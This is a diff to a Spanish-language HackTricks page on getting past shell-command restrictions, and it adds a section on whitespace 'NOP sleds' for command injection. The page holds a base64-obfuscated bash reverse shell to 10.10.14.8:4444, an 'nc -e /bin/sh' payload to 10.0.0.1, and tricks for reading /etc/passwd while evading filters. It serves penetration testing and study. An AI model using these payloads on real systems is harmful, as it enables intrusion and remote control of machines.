@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Bypass de Limitaciones Comunes
+## Bypasses de Limitaciones Comunes
 
-### Shell Inversa
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -105,7 +105,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass backslash y slash
+### Bypass backslash and slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -296,7 +296,8 @@ ln /f*
 ```
 ## Bypass de Solo Lectura/Noexec/Distroless
 
-Si estás dentro de un sistema de archivos con las **protecciones de solo lectura y noexec** o incluso en un contenedor distroless, aún hay formas de **ejecutar binarios arbitrarios, ¡incluso un shell!:**
+Si estás dentro de un sistema de archivos con las **protecciones de solo lectura y noexec** o incluso en un contenedor distroless, todavía hay formas de **ejecutar binarios arbitrarios, ¡incluso un shell!:**
+
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -304,15 +305,38 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Bypass de Chroot y otras Cárceles
 
+
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Referencias y Más
+## NOP Sled Basado en Espacio ("Bashsledding")
+
+Cuando una vulnerabilidad te permite controlar parcialmente un argumento que finalmente llega a `system()` u otro shell, es posible que no sepas el desplazamiento exacto en el que la ejecución comienza a leer tu carga útil. Los NOP sleds tradicionales (por ejemplo, `\x90`) **no** funcionan en la sintaxis de shell, pero Bash ignorará inofensivamente los espacios en blanco iniciales antes de ejecutar un comando.
+
+Por lo tanto, puedes crear un *NOP sled para Bash* prefijando tu comando real con una larga secuencia de espacios o caracteres de tabulación:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Si una cadena ROP (o cualquier primitiva de corrupción de memoria) coloca el puntero de instrucción en cualquier lugar dentro del bloque de espacio, el analizador de Bash simplemente omite los espacios en blanco hasta que llega a `nc`, ejecutando tu comando de manera confiable.
+
+Casos de uso prácticos:
+
+1. **Blobs de configuración mapeados en memoria** (por ejemplo, NVRAM) que son accesibles entre procesos.
+2. Situaciones en las que el atacante no puede escribir bytes NULL para alinear la carga útil.
+3. Dispositivos embebidos donde solo está disponible BusyBox `ash`/`sh` – también ignoran los espacios en blanco al principio.
+
+> 🛠️  Combina este truco con gadgets ROP que llaman a `system()` para aumentar drásticamente la fiabilidad de la explotación en enrutadores IoT con limitaciones de memoria.
+
+## Referencias y más
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Explotando días cero en hardware abandonado – Blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
